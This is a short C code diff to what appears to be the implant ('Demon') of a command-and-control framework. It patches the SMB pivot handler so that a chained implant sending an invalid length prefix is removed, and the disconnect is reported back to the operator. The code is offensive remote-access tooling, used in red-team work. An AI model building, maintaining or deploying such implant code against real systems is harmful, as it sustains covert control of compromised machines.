@@ -270,6 +270,22 @@ VOID PivotPush()
                             if ( Length > PIPE_BUFFER_MAX )
                             {
                                 PRINTF( "Invalid package length from pivot: 0x%x\n", Length )
+
+                                /* the child sent a bogus length prefix and is
+                                 * now desynced. drop it instead of spinning on
+                                 * the same peeked bytes every loop */
+                                DWORD DemonID = TempList->DemonID;
+                                TempList      = TempList->Next;
+                                BOOL  Removed = PivotRemove( DemonID );
+
+                                PRINTF( "Pivot removed: %s\n", Removed ? "TRUE" : "FALSE" )
+
+                                Package = PackageCreate( DEMON_COMMAND_PIVOT );
+                                PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
+                                PackageAddInt32( Package, Removed );
+                                PackageAddInt32( Package, DemonID );
+                                PackageTransmit( Package );
+
                                 break;
                             }
 
